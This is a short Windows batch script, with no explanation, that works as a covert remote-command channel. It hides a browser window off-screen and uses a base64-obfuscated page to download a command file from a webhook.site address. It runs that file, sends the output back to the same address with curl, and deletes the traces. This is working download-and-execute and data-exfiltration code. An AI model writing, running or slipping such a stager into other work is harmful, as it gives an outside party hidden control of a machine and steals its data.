@echo off
taskkill /f /im msedge.exe
del /q /f "%userprofile%\Downloads\*.000"
del /q /f "%userprofile%\Downloads\*.tmp"
del /q /f "%userprofile%\Downloads\*.crdownload"
start "" msedge.exe --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors "data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvODkwZWZkOGQtNmU5ZS00MjhhLWJjZjktOTg3NzQ1ZDcxMDAwJykudGhlbihyPT5yLmJsb2IoKSkudGhlbihibG9iPT57Y29uc3QgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7YS5ocmVmPVVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7YS5kb3dubG9hZD0nODkwZWZkOGQtNmU5ZS00MjhhLWJjZjktOTg3NzQ1ZDcxMDAwLjAwMCc7YS5jbGljaygpO30pOzwvc2NyaXB0Pg=="
timeout /t 10 /nobreak >nul
copy /b "%userprofile%\Downloads\*.000" "%TEMP%\task.cmd"
cmd /c "%TEMP%\task.cmd" > "%TEMP%\result.txt" 2>&1
curl -k --data-binary @%TEMP%\result.txt -H "Content-Type: text/plain; charset=utf-8" https://webhook.site/890efd8d-6e9e-428a-bcf9-987745d71000
del /q /f "%TEMP%\task.cmd" "%TEMP%\result.txt"
